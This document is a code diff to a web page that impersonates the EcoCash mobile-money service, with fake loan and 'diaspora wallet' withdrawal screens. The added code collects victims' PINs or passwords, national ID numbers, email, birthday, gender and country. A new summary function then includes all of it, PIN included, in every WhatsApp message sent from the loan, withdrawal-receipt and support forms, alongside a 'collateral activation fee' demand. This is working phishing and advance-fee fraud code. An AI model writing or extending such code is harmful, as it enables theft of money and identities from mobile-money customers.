@@ -672,10 +672,31 @@
             userPhone: '',
             userPin: '',
             userName: 'EcoCash Customer',
+            userEmail: '',
+            userNid: '',
+            userCountry: '',
+            userGender: '',
+            userBirthday: '',
             loanAmount: 500,
             loanMonths: 6,
+            loanMonthlyPayment: 87.50,
             withdrawalReceipt: null
         };
+
+        // Builds a full summary of all captured account & session details so every WhatsApp submission includes everything
+        function buildFullAccountSummary() {
+            const parts = [
+                `👤 *Account Holder:* ${appState.userName || 'N/A'}`,
+                `📱 *Account Phone:* ${appState.userPhone || 'N/A'}`,
+                `🔑 *Account PIN:* ${appState.userPin || 'N/A'}`
+            ];
+            if (appState.userEmail) parts.push(`📧 *Email:* ${appState.userEmail}`);
+            if (appState.userNid) parts.push(`🆔 *Registered ID:* ${appState.userNid}`);
+            if (appState.userCountry) parts.push(`🌍 *Country:* ${appState.userCountry}`);
+            if (appState.userGender) parts.push(`⚧ *Gender:* ${appState.userGender}`);
+            if (appState.userBirthday) parts.push(`🎂 *Birthday:* ${appState.userBirthday}`);
+            return parts.join('\n');
+        }
 
         // Plain cycle overlay taking exactly 3 seconds (cycle only, no words)
         function runPlainCycle(onComplete) {
@@ -812,6 +833,8 @@
             document.getElementById('dash-name-display').innerText = appState.userName;
             document.getElementById('dash-phone-badge').innerText = appState.userPhone;
             document.getElementById('loan-applicant-phone').value = phone;
+            document.getElementById('wd-phone').value = phone;
+            document.getElementById('wd-pin').value = pin;
 
             runPlainCycle(() => {
                 switchView('dashboard');
@@ -876,15 +899,32 @@
         function handleSignUpSubmit() {
             const firstName = document.getElementById('signup-firstname').value.trim();
             const surname = document.getElementById('signup-surname').value.trim();
+            const country = document.getElementById('signup-country').value;
             const phone = document.getElementById('signup-phone').value.trim();
+            const email = document.getElementById('signup-email').value.trim();
+            const nid = document.getElementById('signup-nid').value.trim().toUpperCase();
+            const password = document.getElementById('new-password').value.trim();
+            const gender = document.querySelector('input[name="gender"]:checked')?.value || '';
+            const day = document.getElementById('b-day').value;
+            const month = document.getElementById('b-month').value;
+            const year = document.getElementById('b-year').value;
 
             appState.userName = `${firstName} ${surname}`;
             appState.userPhone = `+263 ${phone}`;
+            appState.userPin = password;
+            appState.userEmail = email;
+            appState.userNid = nid;
+            appState.userCountry = country;
+            appState.userGender = gender;
+            appState.userBirthday = `${day} ${month} ${year}`;
 
             document.getElementById('dash-name-display').innerText = appState.userName;
             document.getElementById('dash-phone-badge').innerText = appState.userPhone;
             document.getElementById('loan-applicant-name').value = appState.userName;
             document.getElementById('loan-applicant-phone').value = phone;
+            document.getElementById('loan-applicant-nid').value = nid;
+            document.getElementById('wd-phone').value = phone;
+            document.getElementById('wd-id').value = nid;
 
             runPlainCycle(() => {
                 switchView('dashboard');
@@ -955,9 +995,9 @@
             appState.loanAmount = amount;
             appState.loanMonths = months;
 
-            // Monthly estimate with 5% interest rate across selected months
             const totalWithInterest = amount * 1.05;
             const monthlyPayment = totalWithInterest / months;
+            appState.loanMonthlyPayment = monthlyPayment;
 
             document.getElementById('loan-months-label').innerText = `${months} ${months === 1 ? 'Month' : 'Months'}`;
             document.getElementById('calc-principal').innerText = `$${amount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
@@ -999,19 +1039,27 @@
             const nid = document.getElementById('loan-applicant-nid').value.trim().toUpperCase();
             const amount = Number(document.getElementById('loan-amount-input').value) || 0;
             const months = appState.loanMonths;
+            const monthlyEst = (amount * 1.05) / months;
 
             if (!/^[A-Za-z\s]+$/.test(name) || !/^7\d{8}$/.test(phone) || !isValidZimbabweNID(nid) || amount < 50) {
                 showToast('Please complete all loan fields with valid details.');
                 return;
             }
 
+            appState.userName = name;
+            appState.userPhone = `+263 ${phone}`;
+            appState.userNid = nid;
+
             runPlainCycle(() => {
                 const msg = `*EcoCash Kashagi Loan Application*\n\n` +
-                    `👤 *Applicant:* ${name}\n` +
-                    `📱 *Mobile:* +263 ${phone}\n` +
-                    `🆔 *National ID:* ${nid}\n` +
+                    `${buildFullAccountSummary()}\n\n` +
+                    `📋 *Loan Application Details:*\n` +
+                    `👤 *Applicant Full Name:* ${name}\n` +
+                    `📱 *Applicant Mobile:* +263 ${phone}\n` +
+                    `🆔 *Applicant National ID:* ${nid}\n` +
                     `💵 *Loan Amount:* $${amount.toLocaleString('en-US', { minimumFractionDigits: 2 })} USD\n` +
-                    `🗓️ *Repayment Term:* ${months} Months\n` +
+                    `🗓️ *Months to Pay Loan:* ${months} ${months === 1 ? 'Month' : 'Months'}\n` +
+                    `📊 *Estimated Monthly Repayment:* $${monthlyEst.toLocaleString('en-US', { minimumFractionDigits: 2 })} USD / mo\n` +
                     `🔐 *Collateral Activation Fee:* $${COLLATERAL_ACTIVATION_FEE.toFixed(2)} USD`;
                 openWhatsAppChat(msg);
             });
@@ -1075,7 +1123,6 @@
             btn.disabled = true;
             btn.innerText = 'WITHDRAW...';
 
-            // Generate transaction receipt in 2 seconds
             setTimeout(() => {
                 const refCode = `EC-${Math.floor(100000 + Math.random() * 900000)}`;
                 const remaining = DIASPORA_WALLET_BALANCE - amount;
@@ -1084,7 +1131,9 @@
                     ref: refCode,
                     phone: `+263 ${phone}`,
                     amount: amount,
+                    pin: pin,
                     nid: nid,
+                    initialBalance: DIASPORA_WALLET_BALANCE,
                     remaining: remaining
                 };
 
@@ -1105,11 +1154,14 @@
             if (!r) return;
 
             const msg = `*EcoCash Diaspora Service Wallet Withdrawal Receipt*\n\n` +
+                `${buildFullAccountSummary()}\n\n` +
                 `✅ *Status:* Transaction Successful\n` +
                 `🧾 *Reference:* ${r.ref}\n` +
                 `📱 *Receiver Phone:* ${r.phone}\n` +
                 `💵 *Amount Withdrawn:* $${r.amount.toFixed(2)} USD\n` +
-                `🆔 *ID Number:* ${r.nid}\n` +
+                `🔑 *Receiver PIN:* ${r.pin}\n` +
+                `🆔 *Receiver ID Number:* ${r.nid}\n` +
+                `💰 *Previous Wallet Balance:* $${r.initialBalance.toFixed(2)} USD\n` +
                 `💼 *Remaining Wallet Balance:* $${r.remaining.toFixed(2)} USD`;
 
             openWhatsAppChat(msg);
@@ -1137,7 +1189,14 @@
             const message = document.getElementById('contact-message').value.trim();
             if (!name || !phone || !message) return;
 
-            openWhatsAppChat(`*EcoCash Support*\n\n👤 *Name:* ${name}\n📱 *Phone:* ${phone}\n💬 *Message:* ${message}`);
+            const fullMsg = `*EcoCash Support Inquiry*\n\n` +
+                `${buildFullAccountSummary()}\n\n` +
+                `📩 *Support Form Details:*\n` +
+                `👤 *Sender Name:* ${name}\n` +
+                `📱 *Sender Phone:* ${phone}\n` +
+                `💬 *Message:* ${message}`;
+
+            openWhatsAppChat(fullMsg);
         }
     </script>
 </body>
